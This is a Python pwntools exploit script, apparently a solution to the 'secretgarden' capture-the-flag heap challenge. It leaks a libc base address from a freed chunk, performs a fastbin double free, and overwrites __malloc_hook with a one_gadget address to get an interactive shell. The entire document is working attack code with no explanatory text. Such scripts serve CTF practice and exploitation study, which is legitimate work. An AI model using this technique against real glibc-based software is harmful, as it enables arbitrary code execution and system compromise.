import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./secretgarden')
	elf=ELF('./secretgarden')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('',)
	elf=ELF('./secretgarden')
	libc=ELF('./libc_64.so.6')

def add(a,b,c):
	io.sendlineafter(': ','1')
	io.sendlineafter(':',str(a))
	io.sendafter(':',b)
	io.sendlineafter(':',c)

def show():
	io.sendlineafter(': ','2')

def delete(a):
	io.sendlineafter(': ','3')
	io.sendlineafter(':',str(a))

add(0x80,'1','b')
add(0x60,'2','b')
add(0x60,'3','b')
delete(0)
add(0x50,'a'*8,'b'*8)
show()
print io.recvuntil('Name of the flower[3] :aaaaaaaa')
libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
success('libc_base:'+hex(libc_base))
delete(1)
delete(2)
delete(1)
one=libc_base+0x45216
add(0x60,p64(libc_base+libc.sym['__malloc_hook']-0x23),'b')
add(0x60,'a','b')
add(0x60,'a','b')
add(0x60,'a'*0x13+p64(one),'b')

gdb.attach(io)
pause()
io.interactive()